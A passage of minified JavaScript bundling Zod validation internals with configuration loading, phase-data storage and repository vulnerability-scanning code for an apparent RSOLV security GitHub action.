H.value;if(U.status==="aborted"||K.status==="aborted")return r1;if(U.status==="dirty"||K.status==="dirty")J.dirty();G.set(U.value,K.value)}return{status:J.value,value:G}})}else{let G=new Map;for(let H of z){let{key:U,value:K}=H;if(U.status==="aborted"||K.status==="aborted")return r1;if(U.status==="dirty"||K.status==="dirty")J.dirty();G.set(U.value,K.value)}return{status:J.value,value:G}}}}Y5.create=(X,J,Q)=>{return new Y5({valueType:J,keyType:X,typeName:o1.ZodMap,...G0(Q)})};class LX extends B0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==L1.set)return C1(Q,{code:q1.invalid_type,expected:L1.set,received:Q.parsedType}),r1;let Y=this._def;if(Y.minSize!==null){if(Q.data.size<Y.minSize.value)C1(Q,{code:q1.too_small,minimum:Y.minSize.value,type:"set",inclusive:!0,exact:!1,message:Y.minSize.message}),J.dirty()}if(Y.maxSize!==null){if(Q.data.size>Y.maxSize.value)C1(Q,{code:q1.too_big,maximum:Y.maxSize.value,type:"set",inclusive:!0,exact:!1,message:Y.maxSize.message}),J.dirty()}let W=this._def.valueType;function z(H){let U=new Set;for(let K of H){if(K.status==="aborted")return r1;if(K.status==="dirty")J.dirty();U.add(K.value)}return{status:J.value,value:U}}let G=[...Q.data.values()].map((H,U)=>W._parse(new L8(Q,H,Q.path,U)));if(Q.common.async)return Promise.all(G).then((H)=>z(H));else return z(G)}min(X,J){return new LX({...this._def,minSize:{value:X,message:f1.toString(J)}})}max(X,J){return new LX({...this._def,maxSize:{value:X,message:f1.toString(J)}})}size(X,J){return this.min(X,J).max(X,J)}nonempty(X){return this.min(1,X)}}LX.create=(X,J)=>{return new LX({valueType:X,minSize:null,maxSize:null,typeName:o1.ZodSet,...G0(J)})};class RJ extends B0{constructor(){super(...arguments);this.validate=this.implement}_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==L1.function)return C1(J,{code:q1.invalid_type,expected:L1.function,received:J.parsedType}),r1;function Q(G,H){return e7({data:G,path:J.path,errorMaps:[J.common.contextualErrorMap,J.schemaErrorMap,FJ(),M6].filter((U)=>!!U),issueData:{code:q1.invalid_arguments,argumentsError:H}})}function Y(G,H){return e7({data:G,path:J.path,errorMaps:[J.common.contextualErrorMap,J.schemaErrorMap,FJ(),M6].filter((U)=>!!U),issueData:{code:q1.invalid_return_type,returnTypeError:H}})}let W={errorMap:J.common.contextualErrorMap},z=J.data;if(this._def.returns instanceof DX){let G=this;return O9(async function(...H){let U=new m9([]),K=await G._def.args.parseAsync(H,W).catch((Z)=>{throw U.addIssue(Q(H,Z)),U}),V=await Reflect.apply(z,this,K);return await G._def.returns._def.type.parseAsync(V,W).catch((Z)=>{throw U.addIssue(Y(V,Z)),U})})}else{let G=this;return O9(function(...H){let U=G._def.args.safeParse(H,W);if(!U.success)throw new m9([Q(H,U.error)]);let K=Reflect.apply(z,this,U.data),V=G._def.returns.safeParse(K,W);if(!V.success)throw new m9([Y(K,V.error)]);return V.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...X){return new RJ({...this._def,args:d8.create(X).rest(y6.create())})}returns(X){return new RJ({...this._def,returns:X})}implement(X){return this.parse(X)}strictImplement(X){return this.parse(X)}static create(X,J,Q){return new RJ({args:X?X:d8.create([]).rest(y6.create()),returns:J||y6.create(),typeName:o1.ZodFunction,...G0(Q)})}}class IJ extends B0{get schema(){return this._def.getter()}_parse(X){let{ctx:J}=this._processInputParams(X);return this._def.getter()._parse({data:J.data,path:J.path,parent:J})}}IJ.create=(X,J)=>{return new IJ({getter:X,typeName:o1.ZodLazy,...G0(J)})};class CJ extends B0{_parse(X){if(X.data!==this._def.value){let J=this._getOrReturnCtx(X);return C1(J,{received:J.data,code:q1.invalid_literal,expected:this._def.value}),r1}return{status:"valid",value:X.data}}get value(){return this._def.value}}CJ.create=(X,J)=>{return new CJ({value:X,typeName:o1.ZodLiteral,...G0(J)})};function CU(X,J){return new c6({values:X,typeName:o1.ZodEnum,...G0(J)})}class c6 extends B0{_parse(X){if(typeof X.data!=="string"){let J=this._getOrReturnCtx(X),Q=this._def.values;return C1(J,{expected:F0.joinValues(Q),received:J.parsedType,code:q1.invalid_type}),r1}if(!this._cache)this._cache=new Set(this._def.values);if(!this._cache.has(X.data)){let J=this._getOrReturnCtx(X),Q=this._def.values;return C1(J,{received:J.data,code:q1.invalid_enum_value,options:Q}),r1}return O9(X.data)}get options(){return this._def.values}get enum(){let X={};for(let J of this._def.values)X[J]=J;return X}get Values(){let X={};for(let J of this._def.values)X[J]=J;return X}get Enum(){let X={};for(let J of this._def.values)X[J]=J;return X}extract(X,J=this._def){return c6.create(X,{...this._def,...J})}exclude(X,J=this._def){return c6.create(this.options.filter((Q)=>!X.includes(Q)),{...this._def,...J})}}c6.create=CU;class PJ extends B0{_parse(X){let J=F0.getValidEnumValues(this._def.values),Q=this._getOrReturnCtx(X);if(Q.parsedType!==L1.string&&Q.parsedType!==L1.number){let Y=F0.objectValues(J);return C1(Q,{expected:F0.joinValues(Y),received:Q.parsedType,code:q1.invalid_type}),r1}if(!this._cache)this._cache=new Set(F0.getValidEnumValues(this._def.values));if(!this._cache.has(X.data)){let Y=F0.objectValues(J);return C1(Q,{received:Q.data,code:q1.invalid_enum_value,options:Y}),r1}return O9(X.data)}get enum(){return this._def.values}}PJ.create=(X,J)=>{return new PJ({values:X,typeName:o1.ZodNativeEnum,...G0(J)})};class DX extends B0{unwrap(){return this._def.type}_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==L1.promise&&J.common.async===!1)return C1(J,{code:q1.invalid_type,expected:L1.promise,received:J.parsedType}),r1;let Q=J.parsedType===L1.promise?J.data:Promise.resolve(J.data);return O9(Q.then((Y)=>{return this._def.type.parseAsync(Y,{path:J.path,errorMap:J.common.contextualErrorMap})}))}}DX.create=(X,J)=>{return new DX({type:X,typeName:o1.ZodPromise,...G0(J)})};class D8 extends B0{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===o1.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X),Y=this._def.effect||null,W={addIssue:(z)=>{if(C1(Q,z),z.fatal)J.abort();else J.dirty()},get path(){return Q.path}};if(W.addIssue=W.addIssue.bind(W),Y.type==="preprocess"){let z=Y.transform(Q.data,W);if(Q.common.async)return Promise.resolve(z).then(async(G)=>{if(J.value==="aborted")return r1;let H=await this._def.schema._parseAsync({data:G,path:Q.path,parent:Q});if(H.status==="aborted")return r1;if(H.status==="dirty")return RX(H.value);if(J.value==="dirty")return RX(H.value);return H});else{if(J.value==="aborted")return r1;let G=this._def.schema._parseSync({data:z,path:Q.path,parent:Q});if(G.status==="aborted")return r1;if(G.status==="dirty")return RX(G.value);if(J.value==="dirty")return RX(G.value);return G}}if(Y.type==="refinement"){let z=(G)=>{let H=Y.refinement(G,W);if(Q.common.async)return Promise.resolve(H);if(H instanceof Promise)throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return G};if(Q.common.async===!1){let G=this._def.schema._parseSync({data:Q.data,path:Q.path,parent:Q});if(G.status==="aborted")return r1;if(G.status==="dirty")J.dirty();return z(G.value),{status:J.value,value:G.value}}else return this._def.schema._parseAsync({data:Q.data,path:Q.path,parent:Q}).then((G)=>{if(G.status==="aborted")return r1;if(G.status==="dirty")J.dirty();return z(G.value).then(()=>{return{status:J.value,value:G.value}})})}if(Y.type==="transform")if(Q.common.async===!1){let z=this._def.schema._parseSync({data:Q.data,path:Q.path,parent:Q});if(!h6(z))return r1;let G=Y.transform(z.value,W);if(G instanceof Promise)throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:J.value,value:G}}else return this._def.schema._parseAsync({data:Q.data,path:Q.path,parent:Q}).then((z)=>{if(!h6(z))return r1;return Promise.resolve(Y.transform(z.value,W)).then((G)=>({status:J.value,value:G}))});F0.assertNever(Y)}}D8.create=(X,J,Q)=>{return new D8({schema:X,typeName:o1.ZodEffects,effect:J,...G0(Q)})};D8.createWithPreprocess=(X,J,Q)=>{return new D8({schema:J,effect:{type:"preprocess",transform:X},typeName:o1.ZodEffects,...G0(Q)})};class N8 extends B0{_parse(X){if(this._getType(X)===L1.undefined)return O9(void 0);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}}N8.create=(X,J)=>{return new N8({innerType:X,typeName:o1.ZodOptional,...G0(J)})};class j6 extends B0{_parse(X){if(this._getType(X)===L1.null)return O9(null);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}}j6.create=(X,J)=>{return new j6({innerType:X,typeName:o1.ZodNullable,...G0(J)})};class SJ extends B0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;if(J.parsedType===L1.undefined)Q=this._def.defaultValue();return this._def.innerType._parse({data:Q,path:J.path,parent:J})}removeDefault(){return this._def.innerType}}SJ.create=(X,J)=>{return new SJ({innerType:X,typeName:o1.ZodDefault,defaultValue:typeof J.default==="function"?J.default:()=>J.default,...G0(J)})};class TJ extends B0{_parse(X){let{ctx:J}=this._processInputParams(X),Q={...J,common:{...J.common,issues:[]}},Y=this._def.innerType._parse({data:Q.data,path:Q.path,parent:{...Q}});if(jJ(Y))return Y.then((W)=>{return{status:"valid",value:W.status==="valid"?W.value:this._def.catchValue({get error(){return new m9(Q.common.issues)},input:Q.data})}});else return{status:"valid",value:Y.status==="valid"?Y.value:this._def.catchValue({get error(){return new m9(Q.common.issues)},input:Q.data})}}removeCatch(){return this._def.innerType}}TJ.create=(X,J)=>{return new TJ({innerType:X,typeName:o1.ZodCatch,catchValue:typeof J.catch==="function"?J.catch:()=>J.catch,...G0(J)})};class W5 extends B0{_parse(X){if(this._getType(X)!==L1.nan){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:L1.nan,received:Q.parsedType}),r1}return{status:"valid",value:X.data}}}W5.create=(X)=>{return new W5({typeName:o1.ZodNaN,...G0(X)})};var bP=Symbol("zod_brand");class rQ extends B0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;return this._def.type._parse({data:Q,path:J.path,parent:J})}unwrap(){return this._def.type}}class G5 extends B0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.common.async)return(async()=>{let W=await this._def.in._parseAsync({data:Q.data,path:Q.path,parent:Q});if(W.status==="aborted")return r1;if(W.status==="dirty")return J.dirty(),RX(W.value);else return this._def.out._parseAsync({data:W.value,path:Q.path,parent:Q})})();else{let Y=this._def.in._parseSync({data:Q.data,path:Q.path,parent:Q});if(Y.status==="aborted")return r1;if(Y.status==="dirty")return J.dirty(),{status:"dirty",value:Y.value};else return this._def.out._parseSync({data:Y.value,path:Q.path,parent:Q})}}static create(X,J){return new G5({in:X,out:J,typeName:o1.ZodPipeline})}}class _J extends B0{_parse(X){let J=this._def.innerType._parse(X),Q=(Y)=>{if(h6(Y))Y.value=Object.freeze(Y.value);return Y};return jJ(J)?J.then((Y)=>Q(Y)):Q(J)}unwrap(){return this._def.innerType}}_J.create=(X,J)=>{return new _J({innerType:X,typeName:o1.ZodReadonly,...G0(J)})};function LU(X,J){let Q=typeof X==="function"?X(J):typeof X==="string"?{message:X}:X;return typeof Q==="string"?{message:Q}:Q}function PU(X,J={},Q){if(X)return NX.create().superRefine((Y,W)=>{let z=X(Y);if(z instanceof Promise)return z.then((G)=>{if(!G){let H=LU(J,Y),U=H.fatal??Q??!0;W.addIssue({code:"custom",...H,fatal:U})}});if(!z){let G=LU(J,Y),H=G.fatal??Q??!0;W.addIssue({code:"custom",...G,fatal:H})}return});return NX.create()}var vP={object:u0.lazycreate},o1;(function(X){X.ZodString="ZodString",X.ZodNumber="ZodNumber",X.ZodNaN="ZodNaN",X.ZodBigInt="ZodBigInt",X.ZodBoolean="ZodBoolean",X.ZodDate="ZodDate",X.ZodSymbol="ZodSymbol",X.ZodUndefined="ZodUndefined",X.ZodNull="ZodNull",X.ZodAny="ZodAny",X.ZodUnknown="ZodUnknown",X.ZodNever="ZodNever",X.ZodVoid="ZodVoid",X.ZodArray="ZodArray",X.ZodObject="ZodObject",X.ZodUnion="ZodUnion",X.ZodDiscriminatedUnion="ZodDiscriminatedUnion",X.ZodIntersection="ZodIntersection",X.ZodTuple="ZodTuple",X.ZodRecord="ZodRecord",X.ZodMap="ZodMap",X.ZodSet="ZodSet",X.ZodFunction="ZodFunction",X.ZodLazy="ZodLazy",X.ZodLiteral="ZodLiteral",X.ZodEnum="ZodEnum",X.ZodEffects="ZodEffects",X.ZodNativeEnum="ZodNativeEnum",X.ZodOptional="ZodOptional",X.ZodNullable="ZodNullable",X.ZodDefault="ZodDefault",X.ZodCatch="ZodCatch",X.ZodPromise="ZodPromise",X.ZodBranded="ZodBranded",X.ZodPipeline="ZodPipeline",X.ZodReadonly="ZodReadonly"})(o1||(o1={}));var xP=(X,J={message:`Input not instance of ${X.name}`})=>PU((Q)=>Q instanceof X,J),SU=R8.create,TU=m6.create,fP=W5.create,gP=u6.create,_U=AJ.create,hP=AX.create,yP=X5.create,mP=NJ.create,uP=LJ.create,cP=NX.create,lP=y6.create,pP=p8.create,dP=J5.create,iP=A8.create,rP=u0.create,nP=u0.strictCreate,aP=DJ.create,sP=iQ.create,oP=wJ.create,tP=d8.create,eP=Q5.create,XS=Y5.create,JS=LX.create,QS=RJ.create,YS=IJ.create,WS=CJ.create,GS=c6.create,zS=PJ.create,HS=DX.create,US=D8.create,KS=N8.create,VS=j6.create,BS=D8.createWithPreprocess,qS=G5.create,ZS=()=>SU().optional(),MS=()=>TU().optional(),FS=()=>_U().optional(),jS={string:(X)=>R8.create({...X,coerce:!0}),number:(X)=>m6.create({...X,coerce:!0}),boolean:(X)=>AJ.create({...X,coerce:!0}),bigint:(X)=>u6.create({...X,coerce:!0}),date:(X)=>AX.create({...X,coerce:!0})};var OS=r1;t1();var RS=_1.object({provider:_1.string(),apiKey:_1.string().optional(),model:_1.string(),baseUrl:_1.string().optional(),maxTokens:_1.number().optional(),temperature:_1.number().optional(),contextLimit:_1.number().optional(),timeout:_1.number().optional(),useVendedCredentials:_1.boolean().optional()}),AS=_1.object({enabled:_1.boolean(),image:_1.string().optional(),memoryLimit:_1.string().optional(),cpuLimit:_1.string().optional(),timeout:_1.number().optional(),securityProfile:_1.enum(["default","strict","relaxed"]).optional(),environmentVariables:_1.record(_1.string(),_1.string()).optional()}),NS=_1.object({disableNetworkAccess:_1.boolean().optional(),allowedDomains:_1.array(_1.string()).optional(),scanDependencies:_1.boolean().optional(),preventSecretLeakage:_1.boolean().optional(),maxFileSize:_1.number().optional(),timeoutSeconds:_1.number().optional(),requireCodeReview:_1.boolean().optional()}),LS=_1.object({enabled:_1.boolean().optional(),generateForVulnerabilities:_1.boolean().optional(),includeInPR:_1.boolean().optional(),validateFixes:_1.boolean().optional(),languages:_1.array(_1.string()).optional(),frameworks:_1.record(_1.string(),_1.array(_1.string())).optional()}),DS=_1.object({enabled:_1.boolean().optional(),maxIterations:_1.number().optional(),maxIterationsByType:_1.record(_1.string(),_1.number()).optional(),maxIterationsByTier:_1.record(_1.string(),_1.number()).optional()}),wS=_1.object({apiKey:_1.string(),configPath:_1.string(),issueLabel:_1.string(),scanLabel:_1.string().optional(),enableSecurityAnalysis:_1.boolean().optional(),environmentVariables:_1.record(_1.string(),_1.string()).optional(),repoToken:_1.string().optional(),aiProvider:RS,containerConfig:AS,securitySettings:NS,rsolvApiKey:_1.string().optional(),maxIssues:_1.number().min(1).optional(),useGitBasedEditing:_1.boolean().optional(),useStructuredPhases:_1.boolean().optional(),testGeneration:LS.optional(),fixValidation:DS.optional()});async function EU(){try{q.info("Loading configuration");let X=IS(),J=process.env.RSOLV_CONFIG_PATH||".github/rsolv.yml",Q=await CS(J),Y=PS(),W={...X,...Q,...Y,aiProvider:{...X.aiProvider,...Q.aiProvider,...Y.aiProvider},containerConfig:{...X.containerConfig,...Q.containerConfig,...Y.containerConfig},securitySettings:{...X.securitySettings,...Q.securitySettings,...Y.securitySettings}},z=SS(W);if(z.aiProvider.useVendedCredentials&&z.rsolvApiKey)process.env.RSOLV_API_KEY=z.rsolvApiKey,q.info("Set RSOLV_API_KEY environment variable for vended credentials (config loader)");return q.debug("Configuration loaded successfully"),q.info(`Final config - rsolvApiKey: ${z.rsolvApiKey?"present":"not set"}`),z}catch(X){throw q.error("Failed to load configuration",X),new Error(`Configuration error: ${X instanceof Error?X.message:String(X)}`)}}function IS(){return{configPath:".github/rsolv.yml",issueLabel:"rsolv:automate",scanLabel:"rsolv:detected",enableSecurityAnalysis:!0,maxIssues:void 0,useGitBasedEditing:!0,useStructuredPhases:!0,aiProvider:{provider:"claude-code",model:"claude-sonnet-4-20250514",temperature:0.2,maxTokens:4000,contextLimit:1e5,timeout:3600000,useVendedCredentials:!0},containerConfig:{enabled:!0,image:"rsolv/code-analysis:latest",memoryLimit:"2g",cpuLimit:"1",timeout:300,securityProfile:"default"},securitySettings:{disableNetworkAccess:!0,scanDependencies:!0,preventSecretLeakage:!0,maxFileSize:1048576,timeoutSeconds:300,requireCodeReview:!0},testGeneration:{enabled:process.env.ENABLE_TEST_GENERATION==="true",generateForVulnerabilities:!0,includeInPR:!0,validateFixes:process.env.ENABLE_FIX_VALIDATION==="true",languages:process.env.TEST_GEN_LANGUAGES?.split(",")||["javascript","typescript"],frameworks:{javascript:["jest","mocha","vitest"],typescript:["jest","mocha","vitest"],python:["pytest","unittest"],ruby:["rspec","minitest"],php:["phpunit","pest"],java:["junit5","testng"]}},fixValidation:{enabled:(()=>{let X=process.env.DISABLE_FIX_VALIDATION,J=X==="true";return console.log(`[CONFIG DEBUG] DISABLE_FIX_VALIDATION env: "${X}"`),console.log(`[CONFIG DEBUG] Setting fixValidation.enabled to: ${!J}`),!J})(),maxIterations:3,maxIterationsByType:{},maxIterationsByTier:{}}}}async function CS(X){try{if(!aQ.existsSync(X))return q.info(`Configuration file not found at ${X}, using defaults`),{};q.info(`Loading configuration from ${X}`);let J=aQ.readFileSync(X,"utf8"),Q=RU(J);return q.debug("Configuration file loaded successfully"),Q||{}}catch(J){return q.error(`Error loading configuration from file ${X}`,J),{}}}function PS(){q.info("Loading configuration from environment variables"),q.info(`Environment RSOLV_API_KEY: ${process.env.RSOLV_API_KEY?"present":"not set"}`);let X=process.env.RSOLV_API_KEY||process.env.INPUT_API_KEY||process.env.INPUT_RSOLVAPI_KEY||process.env.INPUT_RSOLVAPIKEY,J={apiKey:X,rsolvApiKey:X,configPath:process.env.RSOLV_CONFIG_PATH||process.env.INPUT_CONFIG_PATH,issueLabel:process.env.RSOLV_ISSUE_LABEL||process.env.INPUT_ISSUE_LABEL,repoToken:process.env.GITHUB_TOKEN};if(process.env.RSOLV_MAX_ISSUES){let Q=parseInt(process.env.RSOLV_MAX_ISSUES,10);if(!isNaN(Q))J.maxIssues=Q}if(process.env.RSOLV_USE_GIT_BASED_EDITING!==void 0)J.useGitBasedEditing=process.env.RSOLV_USE_GIT_BASED_EDITING==="true";else J.useGitBasedEditing=!0;if(process.env.RSOLV_USE_STRUCTURED_PHASES!==void 0)J.useStructuredPhases=process.env.RSOLV_USE_STRUCTURED_PHASES==="true";else J.useStructuredPhases=!0;if(process.env.RSOLV_ENVIRONMENT_VARIABLES)try{J.environmentVariables=JSON.parse(process.env.RSOLV_ENVIRONMENT_VARIABLES)}catch(Q){q.error("Error parsing RSOLV_ENVIRONMENT_VARIABLES",Q)}if(process.env.RSOLV_AI_PROVIDER){if(J.aiProvider={provider:process.env.RSOLV_AI_PROVIDER,apiKey:process.env.RSOLV_AI_API_KEY,model:process.env.RSOLV_AI_MODEL||"claude-3-sonnet-20240229",baseUrl:process.env.RSOLV_AI_BASE_URL},process.env.RSOLV_AI_TEMPERATURE)J.aiProvider.temperature=parseFloat(process.env.RSOLV_AI_TEMPERATURE);if(process.env.RSOLV_AI_MAX_TOKENS)J.aiProvider.maxTokens=parseInt(process.env.RSOLV_AI_MAX_TOKENS,10)}if(process.env.RSOLV_CONTAINER_ENABLED!==void 0){if(J.containerConfig={enabled:process.env.RSOLV_CONTAINER_ENABLED==="true",image:process.env.RSOLV_CONTAINER_IMAGE,memoryLimit:process.env.RSOLV_CONTAINER_MEMORY_LIMIT,cpuLimit:process.env.RSOLV_CONTAINER_CPU_LIMIT},process.env.RSOLV_CONTAINER_TIMEOUT)J.containerConfig.timeout=parseInt(process.env.RSOLV_CONTAINER_TIMEOUT,10)}return Object.keys(J).forEach((Q)=>{if(J[Q]===void 0)delete J[Q]}),J}function SS(X){q.debug("Validating configuration");try{if(!X.apiKey&&!X.rsolvApiKey)throw new Error("API key or RSOLV API key is required");let J=wS.parse(X);return q.debug("Configuration validation successful"),J}catch(J){if(J instanceof _1.ZodError){let Q=J.errors.map((Y)=>`${Y.path.join(".")}: ${Y.message}`).join(", ");throw q.error(`Configuration validation failed: ${Q}`),new Error(`Invalid configuration: ${Q}`)}throw J}}t1();i8();var wT=["scan","validate","mitigate","full"];function IT(){let X=process.argv.slice(2);for(let J=0;J<X.length;J++){let Q=X[J];if(Q.startsWith("--mode="))return Q.substring(7);if(Q==="--mode"&&J+1<X.length)return X[J+1]}return}function IK(){let X=IT();if(X&&wK(X))return X;let J=process.env.RSOLV_MODE||process.env.INPUT_MODE;if(J&&wK(J))return J;if(process.env.RSOLV_SCAN_MODE==="scan")return"scan";return"full"}function wK(X){return wT.includes(X)}function CK(X){switch(X){case"scan":return"Scan for vulnerabilities and create issues";case"validate":return"Validate vulnerabilities with failing tests";case"mitigate":return"Fix validated vulnerabilities";case"full":return"Run all phases: scan, validate, and mitigate";default:return"Unknown mode"}}class fY{apiKey;baseUrl;headers;usePlatformStorage;constructor(X,J=process.env.RSOLV_API_URL||"https://api.rsolv.dev"){this.apiKey=X;this.baseUrl=J;this.headers=new Headers({"Content-Type":"application/json","X-API-Key":X}),this.usePlatformStorage=process.env.USE_PLATFORM_STORAGE!=="false"}async storePhaseResults(X,J,Q){if(!this.usePlatformStorage)return this.storeLocally(X,J,Q);try{let W={scan:"scan",validate:"validation",mitigate:"mitigation"}[X]||X,z=await fetch(`${this.baseUrl}/api/v1/phases/store`,{method:"POST",headers:this.headers,body:JSON.stringify({phase:W,data:J,...Q})});if(!z.ok)throw new Error(`Platform storage failed: ${z.statusText}`);return{...await z.json(),storage:"platform"}}catch(Y){return console.warn("Platform storage failed, falling back to local:",Y),this.storeLocally(X,J,Q)}}async retrievePhaseResults(X,J,Q){if(!this.usePlatformStorage)return this.retrieveLocally(X,J,Q);try{let Y=await fetch(`${this.baseUrl}/api/v1/phases/retrieve?repo=${encodeURIComponent(X)}&issue=${J}&commit=${encodeURIComponent(Q)}`,{headers:this.headers});if(Y.status===404)return this.retrieveLocally(X,J,Q);if(!Y.ok)throw new Error(`Platform retrieval failed: ${Y.statusText}`);let W=await Y.json();if(console.log("[PhaseDataClient] Retrieved from platform:",{hasValidation:!!W?.validation,hasValidate:!!W?.validate,keys:Object.keys(W||{})}),W&&W.validation&&!W.validate)console.log("[PhaseDataClient] Mapping validation -> validate"),W.validate=W.validation,delete W.validation;if(W&&W.mitigation&&!W.mitigate)console.log("[PhaseDataClient] Mapping mitigation -> mitigate"),W.mitigate=W.mitigation,delete W.mitigation;return console.log("[PhaseDataClient] Returning data with keys:",Object.keys(W||{})),W}catch(Y){return console.warn("Platform retrieval failed, falling back to local:",Y),this.retrieveLocally(X,J,Q)}}async validatePhaseTransition(X,J,Q){if(await this.getCurrentCommitSha()!==Q)return!1;return{scan:["validate"],validate:["mitigate"],mitigate:[]}[X]?.includes(J)??!1}async storeLocally(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),z=".rsolv/phase-data";await Y.mkdir(".rsolv/phase-data",{recursive:!0});let G=`${Q.repo.replace("/","-")}-${Q.issueNumber||"scan"}-${X}.json`,H=W.join(".rsolv/phase-data",G);return await Y.writeFile(H,JSON.stringify({phase:X,data:J,metadata:Q,timestamp:new Date().toISOString()},null,2)),{success:!0,storage:"local",warning:"Platform unavailable, stored locally"}}async retrieveLocally(X,J,Q){let Y=await import("fs/promises"),W=await import("path"),z=".rsolv/phase-data",H=`${X.replace("/","-")}-${J}-`;try{let K=(await Y.readdir(".rsolv/phase-data")).filter((B)=>B.startsWith(H)),V={};for(let B of K){let Z=await Y.readFile(W.join(".rsolv/phase-data",B),"utf-8"),M=JSON.parse(Z);if(M.metadata.commitSha===Q)Object.assign(V,M.data)}return Object.keys(V).length>0?V:null}catch{return null}}async getCurrentCommitSha(){let{execSync:X}=await import("child_process");return X("git rev-parse HEAD").toString().trim()}}XQ();i8();t1();V5();t1();class gz{apiClient;cache=new Map;constructor(X){this.apiClient=new P6({apiKey:X,baseUrl:process.env.RSOLV_API_URL||"https://api.rsolv.dev"})}async validateVulnerabilities(X,J){if(X.length===0)return[];q.info(`Validating ${X.length} vulnerabilities with AST analysis`);try{let Q=this.prepareValidationRequest(X,J),Y=await this.callValidationAPI(Q);return this.processValidationResponse(X,Y)}catch(Q){return q.warn("AST validation failed, using all vulnerabilities",{error:Q instanceof Error?Q.message:Q,stack:Q instanceof Error?Q.stack:void 0}),X}}prepareValidationRequest(X,J){let Q=X.map((W)=>({id:`${W.type}-${W.line}-${W.column||0}`,type:W.type,patternId:W.type,filePath:W.filePath||"",line:W.line,code:W.snippet||"",severity:W.severity})),Y={};for(let[W,z]of J)Y[W]={content:z};return{vulnerabilities:Q,files:Y}}async callValidationAPI(X){let J=await this.apiClient.validateVulnerabilities(X);if(process.env.DEBUG_AST_VALIDATION)console.log("AST Validation Request:",JSON.stringify(X,null,2)),console.log("AST Validation Response:",JSON.stringify(J,null,2));return J}processValidationResponse(X,J){let Q=new Map(J.validated.map((W)=>[W.id,W])),Y=X.filter((W)=>{let z=`${W.type}-${W.line}-${W.column||0}`,G=Q.get(z);if(!G)return!0;if(!G.isValid)return q.debug(`Filtered false positive: ${W.filePath}:${W.line} - ${G.reason}`),!1;return!0});return q.info(`AST validation complete: ${J.stats.rejected} false positives filtered out`),Y}getCacheKey(X,J,Q){return`${X}:${J}:${Q}`}}class hz{detector;github;constructor(){this.detector=new JX(CX()),this.github=c0()}async scan(X){q.info(`Starting vulnerability scan for ${X.repository.owner}/${X.repository.name}`);let J=Date.now(),Q=await this.getRepositoryFiles(X),Y=[];q.info(`Found ${Q.length} files to scan`),q.info(`Starting vulnerability detection on ${Q.length} files...`);for(let G=0;G<Q.length;G++){let H=Q[G];if(G===0||G===Q.length-1||(G+1)%10===0)q.info(`Scanning progress: ${G+1}/${Q.length} files (${H.path})`);if(H.language&&this.isSupportedLanguage(H.language))try{let U=await this.detector.detect(H.content,H.language);if(U.forEach((K)=>{K.filePath=H.path}),Y.push(...U),U.length>0)q.info(`Found ${U.length} vulnerabilities in ${H.path}`)}catch(U){q.error(`Error scanning file ${H.path}:`,U)}}if(q.info(`Scanning complete. Total vulnerabilities found: ${Y.length}`),X.enableASTValidation!==!1&&X.rsolvApiKey&&typeof X.rsolvApiKey==="string"&&X.rsolvApiKey.length>0){q.info("Performing AST validation on detected vulnerabilities (enabled by default)...");let G=new gz(X.rsolvApiKey),H=new Map;Q.forEach((V)=>H.set(V.path,V.content));let U=Y.length;Y=await G.validateVulnerabilities(Y,H);let K=U-Y.length;q.info(`AST validation complete: ${K} false positives filtered out`)}else if(X.enableASTValidation!==!1)q.warn("AST validation is enabled but skipped - missing RSOLV API key");let W=this.groupVulnerabilities(Y),z=Date.now()-J;return q.info(`Scan completed in ${z}ms. Found ${Y.length} vulnerabilities`),{repository:`${X.repository.owner}/${X.repository.name}`,branch:X.repository.defaultBranch,scanDate:new Date().toISOString(),totalFiles:Q.length,scannedFiles:Q.filter((G)=>G.language&&this.isSupportedLanguage(G.language)).length,vulnerabilities:Y,groupedVulnerabilities:W,createdIssues:[]}}async getRepositoryFiles(X){let J=[];try{let{data:Q}=await this.github.git.getTree({owner:X.repository.owner,repo:X.repository.name,tree_sha:X.repository.defaultBranch,recursive:"1"}),Y=Q.tree.filter((W)=>W.type==="blob"&&W.path&&this.isCodeFile(W.path)&&W.size&&W.size<1e6);q.info(`Fetching content for ${Y.length} code files...`);for(let W=0;W<Y.length;W++){let z=Y[W];if(!z.path||!z.sha)continue;if(W===0||W===Y.length-1||(W+1)%10===0)q.info(`Progress: ${W+1}/${Y.length} files fetched (${z.path})`);try{let{data:G}=await this.github.git.getBlob({owner:X.repository.owner,repo:X.repository.name,file_sha:z.sha}),H=Buffer.from(G.content,"base64").toString("utf-8"),U=this.detectLanguage(z.path);if(U)J.push({path:z.path,content:H,language:U})}catch(G){q.error(`Error fetching content for ${z.path}:`,G)}}q.info(`Completed fetching ${J.length} files with supported languages`)}catch(Q){throw q.error("Error getting repository files:",Q),Q}return J}isCodeFile(X){return[".js",".jsx",".ts",".tsx",".mjs",".cjs",".py",".pyw",".rb",".rake",".java",".php",".phtml",".ex",".exs"].some((Q)=>X.endsWith(Q))}detectLanguage(X){let J={".js":"javascript",".jsx":"javascript",".ts":"typescript",".tsx":"typescript",".mjs":"javascript",".cjs":"javascript",".py":"python",".pyw":"python",".rb":"ruby",".rake":"ruby",".java":"java",".php":"php",".phtml":"php",".ex":"elixir",".exs":"elixir"},Q=X.substring(X.lastIndexOf("."));return J[Q]||null}isSupportedLanguage(X){return["javascript","typescript","python","ruby","java","php","elixir"].includes(X.toLowerCase())}groupVulnerabilities(X){let J=new Map;for(let Q of X){let Y=`${Q.type}-${Q.severity}`;if(!J.has(Y))J.set(Y,{type:Q.type,severity:Q.severity,count:0,files:[],vulnerabilities:[]});let W=J.get(Y);if(W.count++,W.vulnerabilities.push(Q),Q.filePath&&!W.files.includes(Q.filePath))W.files.push(Q.filePath)}return 